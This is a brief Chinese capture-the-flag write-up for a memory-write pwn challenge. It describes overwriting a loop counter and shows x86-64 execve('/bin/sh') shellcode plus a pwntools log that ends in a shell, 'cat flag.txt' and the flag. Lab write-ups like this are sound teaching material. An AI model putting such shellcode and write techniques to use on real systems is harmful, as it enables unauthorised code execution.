# 思路
- 本题中，stack地址随机化， gdb调试发现很容易就碰撞到
- 修改for循环i的值为50（/bin/sh + payload 整体的大小 + 1）
- syscall，执行/bin/sh， rax=59

# syscall
```
xor rax, rax
push rax          ; NULL terminator
mov rbx, 0x68732f6e69622f2f ; "//bin/sh" (little-endian)
push rbx
mov rdi, rsp      ; rdi points to "/bin/sh"
xor rsi, rsi      ; argv = NULL
xor rdx, rdx      ; envp = NULL
mov rax, 59       ; syscall number for execve
syscall
```
![](https://r2.20161023.xyz/pic/20250714105815994.png)

# getshell
```
    b'Enter memory address (in hex, e.g., 0x12345678): '
[DEBUG] Sent 0xd bytes:
    b'0xc00009cf8f\n'
[DEBUG] Received 0x2a bytes:
    b'Enter byte to write (in hex, e.g., 0xAB): '
[DEBUG] Sent 0x4 bytes:
    b'0x0\n'
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[*] Switching to interactive mode
[DEBUG] Received 0x1b bytes:
    b'Wrote 0x00 to 0xc00009cf8f\n'
Wrote 0x00 to 0xc00009cf8f
[DEBUG] Received 0x24 bytes:
    b'L3AK{60_574ck_15_4lm057_pr3d1c74bl3}'
L3AK{60_574ck_15_4lm057_pr3d1c74bl3}$

```

![](https://r2.20161023.xyz/pic/20250714114136511.png)